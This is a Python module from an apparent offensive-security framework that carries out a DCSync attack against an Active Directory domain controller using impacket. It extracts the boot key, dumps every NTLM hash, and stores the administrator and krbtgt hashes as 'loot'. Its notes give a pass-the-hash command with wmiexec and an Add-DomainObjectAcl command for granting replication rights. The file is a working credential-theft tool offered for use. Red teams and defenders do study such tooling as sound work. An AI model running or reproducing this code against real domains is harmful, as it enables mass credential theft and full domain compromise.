"""DCSync attack -- dump all NTLM hashes from domain via DRSUAPI replication."""

from __future__ import annotations

import binascii
from typing import List

from sovereign.models import AttackResult, Credential, EngagementContext
from sovereign.logger import log
from sovereign.modules.base import BaseModule

try:
    from impacket import transport
    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
    IMPACKET = True
except ImportError:
    IMPACKET = False


class DCsyncModule(BaseModule):
    """DCSync attack -- dump all NTLM hashes from domain via DRSUAPI replication."""

    name = "dcsync"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        target_user: str = str(kwargs.get("target_user", ""))
        output_file: str = str(kwargs.get("output_file", ""))

        if not IMPACKET:
            return [AttackResult("dcsync", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]
        results: List[AttackResult] = []
        log(f"[DCSync] Starting against {ctx.dc_ip} ({ctx.domain})...", "INFO")
        log(f"[DCSync] Requires DA or Replication rights (DS-Replication-Get-Changes-All)", "WARN")

        try:
            # Build SMB transport
            string_binding = f"ncacn_np:{ctx.dc_ip}[\\pipe\\netlogon]"
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_dport(445)

            lm  = binascii.unhexlify(ctx.lm_hash) if ctx.lm_hash else b""
            nt  = binascii.unhexlify(ctx.nt_hash) if ctx.nt_hash else b""
            rpc_transport.setCredentials(
                ctx.username, ctx.password, ctx.domain, lm, nt, b""
            )
            remote_ops = RemoteOperations(rpc_transport, False)
            remote_ops.enableRegistry()

            try:
                boot_key = remote_ops.getBootKey()
                log(f"[DCSync] Boot key obtained: {binascii.hexlify(boot_key).decode()}", "OK")
            except Exception:
                boot_key = None

            # NTDS dump via DRSUAPI
            ntds_hashes: List[str] = []
            def hash_callback(secret: str) -> None:
                ntds_hashes.append(secret)
                if len(ntds_hashes) % 100 == 0:
                    log(f"[DCSync] Extracted {len(ntds_hashes)} hashes...", "INFO")

            NTDS = NTDSHashes(
                None, boot_key,
                isRemote=True,
                history=False,
                noLMHash=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=output_file or "dcsync_hashes",
                justUser=target_user or None,
                printUserStatus=False,
            )
            NTDS.dump()
            NTDS.export()

            log(f"[DCSync] Extracted {len(ntds_hashes)} credentials", "CRIT")
            ctx.loot["dcsync"] = {
                "count": len(ntds_hashes),
                "file": output_file or "dcsync_hashes.ntds",
                "sample": ntds_hashes[:5],
            }

            # Store notable accounts
            for h in ntds_hashes:
                parts = h.split(":")
                if len(parts) >= 4:
                    sam, _, lm_h, nt_h = parts[:4]
                    if sam.lower() in ("administrator", "krbtgt"):
                        ctx.credentials.append(Credential(
                            "ntlm_hash", ctx.domain, sam,
                            f"{lm_h}:{nt_h}", "dcsync",
                            notes=f"DCSync. Use for PTH: -hashes {lm_h}:{nt_h}",
                        ))
                        log(f"[DCSync] {sam}: {nt_h}", "CRIT")

            results.append(AttackResult(
                "dcsync", "domain_dump", "SUCCESS",
                severity="CRITICAL",
                data={"total": len(ntds_hashes), "file": output_file or "dcsync_hashes.ntds"},
                notes=f"Full domain hash dump complete. {len(ntds_hashes)} credentials."
                      f" PTH with admin: wmiexec.py -hashes LM:NT DOMAIN/Administrator@TARGET",
            ))
            remote_ops.finish()

        except Exception as exc:
            err = str(exc)
            if "access denied" in err.lower() or "rpc_s_access_denied" in err.lower():
                log(f"[DCSync] Access Denied — need Domain Admin or replication rights", "ERR")
                results.append(AttackResult("dcsync", "domain_dump", "FAILED",
                                            severity="INFO",
                                            notes="Need DS-Replication-Get-Changes-All privilege. "
                                                  "Grant with: Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' "
                                                  "-Rights DCSync -PrincipalIdentity {your_user}"))
            else:
                log(f"[DCSync] Error: {exc}", "ERR")
                results.append(AttackResult("dcsync", "domain_dump", "FAILED", notes=err))
        return results
